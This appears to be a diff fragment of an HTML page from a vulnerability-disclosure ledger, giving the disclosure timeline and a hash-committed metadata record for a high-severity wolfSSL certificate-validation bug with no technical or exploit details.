+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-03-29</span>
+      <span class="timeline-label">Discovered or logged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-04-05</span>
+      <span class="timeline-label">Sent to maintainer</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Maintainer acknowledged</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-07</span>
+      <span class="timeline-label">Patch released</span>
+    </li>
+    <li class="timeline-pt">
+      <span class="timeline-dot"></span>
+      <span class="timeline-date">2026-05-20</span>
+      <span class="timeline-label">Publicly revealed</span>
+    </li>
+  </ol>
+</div>
+
+<div class="marker">PROVENANCE</div>
+<p class="kicker">SHA-3-512 hash:</p>
+<p class="hash full">f0a0272127e818f17635b5af4aa4e3630e50273d8048fe1d0cbc118003c476935904b2e3f12bc2cabbde80cf02dcf7c6a7607dbb3add0f15d2d452ba3169beb2</p>
+<p class="kicker">Committed 2026-04-05 23:37 UTC</p>
+<p class="kicker">Revealed 2026-05-20 07:40 UTC</p>
+<p class="kicker">
+  <a download="ANT-2026-K8YY7WWS-preimage.json"
+     href="data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-K8YY7WWS%22%2C%22bug_class%22%3A%22improper-cert-validation%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3Anull%2C%22created_at%22%3A%222026-03-29T20%3A42%3A36%2B00%3A00%22%2C%22description%22%3Anull%2C%22discovered_at%22%3Anull%2C%22location%22%3Anull%2C%22poc_sha256%22%3Anull%2C%22preimage_version%22%3A1%2C%22project%22%3A%22wolfSSL%22%2C%22reproduction%22%3Anull%2C%22technical_details%22%3Anull%2C%22title%22%3A%22wolfssl%20x509%20verify%20cert%20leaf%20signature%20verification%20by%22%2C%22vendor_severity%22%3A%22high%22%7D">Verify (download preimage.json)</a>
+</p>
+<details class="preimage">
+  <summary>Show preimage JSON</summary>
+  <pre class="preimage-body">{
+  &#34;ant_id&#34;: &#34;ANT-2026-K8YY7WWS&#34;,
+  &#34;bug_class&#34;: &#34;improper-cert-validation&#34;,
+  &#34;claude_severity&#34;: &#34;high&#34;,
+  &#34;commit_sha&#34;: null,
+  &#34;created_at&#34;: &#34;2026-03-29T20:42:36+00:00&#34;,
+  &#34;description&#34;: null,
+  &#34;discovered_at&#34;: null,
+  &#34;location&#34;: null,
+  &#34;poc_sha256&#34;: null,
+  &#34;preimage_version&#34;: 1,
+  &#34;project&#34;: &#34;wolfSSL&#34;,
+  &#34;reproduction&#34;: null,
+  &#34;technical_details&#34;: null,
+  &#34;title&#34;: &#34;wolfssl x509 verify cert leaf signature verification by&#34;,
+  &#34;vendor_severity&#34;: &#34;high&#34;
+}</pre>
+</details>
+</main>
+<footer>
+  <p>Anthropic Frontier Red Team</p>
+  <p>Snapshot generated at 2026-11-02 19:30 UTC</p>
+  <p>Dates and times are in UTC</p>
+  <p>Manifest hash <code>25d811e7b56632ef5bbb23eb…</code></p>
+  <p>Archived snapshots remain available at their dated paths so any figure can be verified against the page that was live on that date</p>
+  <p><a href="../data/payload.json">payload.json</a></p>
+</footer>
+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
